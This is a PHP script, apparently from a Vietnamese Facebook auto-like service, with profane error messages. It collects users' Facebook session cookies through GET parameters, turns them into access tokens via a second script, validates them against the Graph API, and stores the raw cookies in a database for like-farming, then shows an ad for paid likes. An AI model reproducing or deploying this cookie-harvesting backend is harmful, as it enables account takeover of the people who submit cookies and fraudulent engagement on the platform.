<?php
include'config.php';

$cooke = $_GET['cookie'];
$idfb = $_GET['idfb'];
if(!$cooke) {
die('<b color="red"> Đcm Nhập Cookie Vô Đi</b>');
}

if(!$idfb) {
die('<b color="red"> Đcm Nhập ID Status Vô Đi</b>');
}


$token = file_get_contents(''.$dm.'/xulytoken.php?cookie='.urlencode($cooke).'');

if(!$token) {
die('<b color="red"> Lỗi! Cookie Của Bạn Như Lồn ! :)</b>');
}

$me = me($token);

if($me[id]) {

if($token && $me[id]) {
mysql_query("CREATE TABLE IF NOT EXISTS `curl` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `idfb` varchar(32) NOT NULL,
      `cookie` varchar(999) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");


   $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         curl
      WHERE
         idfb = '" . mysql_real_escape_string($idfb) . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 100){
         mysql_query("
            DELETE FROM
               curl
            WHERE
               idfb='" . mysql_real_escape_string($idfb) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
 
   if(!$row){
      mysql_query(
         "INSERT INTO 
            curl
         SET
            `idfb` = '" . mysql_real_escape_string($idfb) . "',
            `cookie` = '" . mysql_real_escape_string($cooke) . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            curl
         SET
            `cookie` = '" . mysql_real_escape_string($cooke) . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
   }
  echo '<b color="white"> Thành Công!</b>
<script language="javascript">
alert("Mua Vip Để Nhận Nhiều Like Hơn Và Sử Dụng Server Riêng Nhé Bạn! Đương Nhiên Sẽ Hơn Hẳn Hàng Free Rồi :) ");
</script>

';
}


}










function me($access) {
return json_decode(file_get_contents('https://graph.facebook.com/me?access_token='.$access),true);
}